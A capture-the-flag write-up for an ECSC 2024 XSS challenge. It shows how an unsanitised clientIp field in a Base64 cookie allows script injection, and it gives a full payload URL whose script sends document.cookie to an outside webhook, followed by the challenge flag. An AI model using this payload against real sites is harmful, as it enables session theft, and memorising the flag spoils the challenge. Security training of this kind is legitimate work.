# S69

> As a part of our duties we develop and maintain S69 - a special system for responding to malicious content online. Be sure to use it if you see something suspicious.
>
> [https://s69.ecsc24.hack.cert.pl/](https://s69.ecsc24.hack.cert.pl/)


## Solution
We are presented with a classic XSS challenge setup. Turns out that the "reason" field in incident report is not susceptible to XSS - however, we also get the "about you" form. The answers to the form are saved as Base64-encoded JSON object in `about` cookie, which makes finding the vulnerability slightly easier. Let's check if the inputs are properly sanitized by setting the data to the following (Base64-encoded) JSON object and reloading the page:

```
{"email": "example@example.com\"", "password": "example\"", "fax": "169696969\"", "bankingPet": true, "maidenName": true, "clientIp": "127.0.0.1\""}
```

IP is not properly sanitized and it's possible to escape this tag and inject arbitrary code, which can be seen from the presence of an additional quotation mark in the HTML source code:
```
<input name="clientIp" type="text" class="form-control" id="clientIp" aria-describedby="emailHelp" required value="127.0.0.1"" readonly style="background-color: rgba(255, 255, 255, .1); opacity: 1;">
```

Set up a webhook and report the following website: `https://s69.ecsc24.hack.cert.pl/save?email=example@example.com&password=example&clientIp=%22%3E%3Cscript%3Efetch(%60https://webhook.site/0466f46f-760b-41dd-8124-d135879bee15?q=$%7Bdocument.cookie%7D%60).then(x%20=%3E%20console.log(x))%3C/script%3E%3Cinput%20type=%5C%22hidden&fax=100000000&bankingPet=on&maidenName=on`. Copy the `access_token` cookie from the data from the webhook and go to `/secret` to read the flag.

## Flag
`ecsc24{gotta_have_an_xss_challenge_right?}`
